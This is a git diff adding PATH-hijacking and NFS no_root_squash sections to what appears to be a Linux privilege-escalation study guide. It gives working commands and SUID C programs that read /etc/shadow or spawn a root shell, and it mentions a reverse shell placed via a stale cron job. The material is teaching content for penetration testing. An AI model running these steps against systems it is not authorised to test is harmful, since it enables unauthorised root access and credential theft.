@@ -192,3 +192,87 @@ chmod +x FILE
 to make it so it can be ran.
 
 Another case, although similar, is if a old cron job is still set up, in this case the original file could have been removed, if so we can create a new file in the original path so that the new file is executed with the reverse shell
+
+## PATH
+If a folder for which a user has write permissions is located in the PATH, we could potentially hijack an application to run a script. PATH in linux is an environmental variable that tells the operating systems where to search for executables. For any command that is not built into the shell or that is not defined with an absolute path, linux will start searching in folders defined under PATH.
+We can check it with either:
+```sh
+env
+```
+or for a more direct result
+```sh
+echo $PATH
+```
+Whenever we are looking for a way to escalate using this technique there are some things that we need to keep in mind, as it always depends entirely on the existing configuration of the target system:
+- What folders are located under $PATH?
+- Does our user have write privileges for any of these folders?
+- Can we modify $PATH?
+- Is there a script/app that we can start that will be affected by this vulnerability?
+
+To check permissions of all the PATH directories all at once
+```sh
+echo $PATH | tr ':' '\n' | while read i; do ls -ld $i; done
+```
+We could also check for writable folders overall with
+```sh
+find / -writable 2>/dev/null | cut -d '/' -f 2,3 | grep -v proc | sort -u
+```
+
+Now if non of them match, and we do not have write permissions to one of the already existing directories in PATH, then we can hopefully add a directory to which we have permissions to PATH, doing so like:
+```sh
+export PATH=/tmp:$PATH
+```
+Normally `/tmp` would be easiest as we more often than not will have permissions. We do this by using the `export` command which can set environment variables like `PATH`. So we just append the new directory to the already existing one.
+At this point we can try to create a script that tries to launch a system binary of our selection for example (escalation.c):
+```C
+#include<unistd.h>
+void main(){
+setuid(0);
+setgid(0);
+system("hack");
+}
+```
+This script will set itself as root and then try to run a binary called `hack`. As the path is not provided it will also look for it inside the folders listed under path. If we wanted to procede with this C example then we would have to compile it into and executable and set the SUID bit
+```sh
+gcc escalation.c -o escalate -w
+chmod u+s escalate
+```
+Now we can create a file named `hack` that will have whichever command we want for it to run as root, and execute it through our `escalate` script.
+```sh
+echo "cat /etc/shadow" > hack
+./escalate
+```
+Here we create it so it can show `/etc/shadow`, but we could also give it a payload to get a shell like `/bin/bash` or something else.
+
+## NFS
+Privilege escalation vectors are not confined to internal access. Shared folders and remote management interfaces such as SSH and Telnet can also help us gain root access on the target system. Finding a root ssh private key on the target system and connecting via SSH is a way to obtain root instead of trying to increase our current user's privilege level.
+
+Another vector could be a misconfigured network shell. NFS (Network File Sharing) configuration is kept in the `/etc/exports` file, this file is created during the NFS server installation and can usually be read by users.
+The critical element for this privilege escalation is the `no_root_sqash` option. By default, NFS will change the root user to `nfdnobody` and strip any file from operating with root privileges. But if the `no_root_squash` option is present on a writable share, we can create an executable with the SUID bit set and run it on the target system.
+
+We can now start by enumerating mountable shares from our attacking machine like so
+```sh
+showmount -e TargetIP
+```
+We will then mount one of the `no_root_squash` shares to our attacking machine and start building an executable (ej with a share `/tmp`)
+```sh
+mkdir /hacker/folder
+```
+```sh
+mount -o rw TargetIP:/tmp /hacker/folder
+```
+Essentially we are creating a new directory on our attacking machine to then link that directory with the `/tmp` one inside the target machine with read-write permissions, so if we create an executable on our machine it will appear on the target as well. From here we can try a C code to open a shell. (nfs.c)
+```c
+void main(){
+setuid(0);
+setgid(0);
+system("/bin/bash");
+}
+```
+To then compile it and set the SUID bit
+```sh
+gcc nfs.c -o nfs -w
+chmod +s nfs
+```
+And finally run it in the target machine to gain a shell with root.
+
